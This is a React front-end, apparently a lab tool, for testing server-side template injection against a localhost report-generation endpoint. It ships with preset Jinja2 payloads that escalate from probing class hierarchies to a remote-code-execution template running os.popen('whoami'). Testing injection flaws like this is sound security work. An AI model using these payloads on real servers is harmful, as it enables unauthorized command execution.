import { useState } from "react";
import axios from "axios";

export default function ReportGenerator() {
  const [template, setTemplate] = useState("Xin chào {{name}}!");
  const [context, setContext] = useState('{"name":"NexTrade"}');
  const [result, setResult] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const API = "http://localhost:8000/api/it";

  const handleGenerate = async () => {
    if (!template.trim()) {
      setError("Template is required");
      return;
    }

    setLoading(true);
    setError("");
    setResult("");

    let contextObj = {};

    try {
      if (context.trim()) {
        contextObj = JSON.parse(context);
      }
    } catch (err) {
      setError("Context phải là JSON hợp lệ");
      setLoading(false);
      return;
    }

    try {
      const res = await axios.post(`${API}/reports/generate`, {
        template,
        context: contextObj,
      });

      setResult(res.data.rendered || "Không có output");
    } catch (err) {
      const msg =
        err?.response?.data?.detail ||
        err?.response?.data?.error ||
        err.message;

      setError(msg);
    }

    setLoading(false);
  };

  const payloads = [
    { name: "Math", template: "{{7*7}}", context: "{}" },
    { name: "Variable", template: "Hello {{name}}", context: '{"name":"Admin"}' },
    { name: "Class", template: "{{''.__class__}}", context: "{}" },
    { name: "Subclasses", template: "{{''.__class__.__mro__[1].__subclasses__()}}", context: "{}" },
    {
      name: "RCE (whoami)",
      template: "{{self.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read()}}",
      context: "{}",
    },
  ];

  return (
    <div className="p-6 max-w-5xl mx-auto">
      <h1 className="text-3xl font-bold mb-6">SSTI Tester</h1>

      {/* TEMPLATE */}
      <textarea
        value={template}
        onChange={(e) => setTemplate(e.target.value)}
        className="w-full border p-3 mb-4 font-mono"
        rows={5}
      />

      {/* CONTEXT */}
      <textarea
        value={context}
        onChange={(e) => setContext(e.target.value)}
        className="w-full border p-3 mb-4 font-mono"
        rows={3}
      />

      {/* BUTTON */}
      <button
        onClick={handleGenerate}
        className="bg-blue-600 text-white px-4 py-2 rounded"
      >
        {loading ? "Loading..." : "Run"}
      </button>

      {/* ERROR */}
      {error && (
        <div className="mt-4 bg-red-100 p-3 text-red-700">{error}</div>
      )}

      {/* RESULT */}
      {result && (
        <div className="mt-4 bg-green-100 p-3">
          <pre className="text-xs whitespace-pre-wrap">{result}</pre>
        </div>
      )}

      {/* PAYLOAD */}
      <div className="mt-6">
        <h2 className="font-bold mb-2">Payload nhanh</h2>

        {payloads.map((p, i) => (
          <button
            key={i}
            onClick={() => {
              setTemplate(p.template);
              setContext(p.context);
              setResult("");
              setError("");
            }}
            className="block w-full text-left border p-2 mb-2 hover:bg-gray-100"
          >
            {p.name}
          </button>
        ))}
      </div>
    </div>
  );
}